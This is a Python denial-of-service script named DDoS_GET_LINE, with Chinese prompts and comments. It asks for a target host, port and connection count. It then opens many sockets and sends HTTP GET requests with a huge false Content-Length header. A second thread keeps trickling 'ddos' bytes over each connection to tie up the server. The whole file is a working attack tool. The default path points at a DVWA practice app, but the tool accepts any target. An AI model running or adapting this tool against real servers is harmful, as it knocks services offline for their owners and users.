import socket
import time
import threading

print("DDoS_GET_LINE版本：release-1.9.9")
print("开发者：On-line")
print("本软件在GitHub开源：https://github.com/lovepc-online/DDoS_GET_LINE")
print("如果您付费购买，那么一定是被骗了！！！")

MAX_CONN = int(input("请设置连接的数量："))  # 设置连接的数量
HOST = input("请设置IPv4地址/网址：")  # 设置IP地址/域名
PORT = int(input("请设置端口号："))  # 设置端口号
PAGE = "/DVWA"

buf = ("GET %s HTTP/1.1\r\n"
       "Host: %s\r\n"
       "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
       "Content-Length: 1000000000\r\n"
       "\r\n" % (PAGE, HOST))  # HTTP请求

socks = []

def conn_thread():
    global socks
    for i in range(0, MAX_CONN):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((HOST, PORT))
            s.send(bytes(buf, encoding='utf-8'))  # 发送HTTP请求
            print("[+] HTTP:Send buf OK!,conn=%d" % i)
            socks.append(s)
        except Exception as ex:
            print("[-] HTTP:Could not connect to server or send error:%s" % ex)
            time.sleep(2)

def send_thread():
    global socks
    for i in range(10):
        for s in socks:
            try:
                s.send(bytes("ddos", encoding='utf-8'))  # ddos攻击
                print("[+] DDoS:send OK!")
            except Exception as ex:
                print("[-] DDoS:send Exception:%s" % ex)
                socks.remove(s)
                s.close()
        time.sleep(1)

conn_th = threading.Thread(target=conn_thread, args=())
send_th = threading.Thread(target=send_thread, args=())
conn_th.start()
send_th.start()
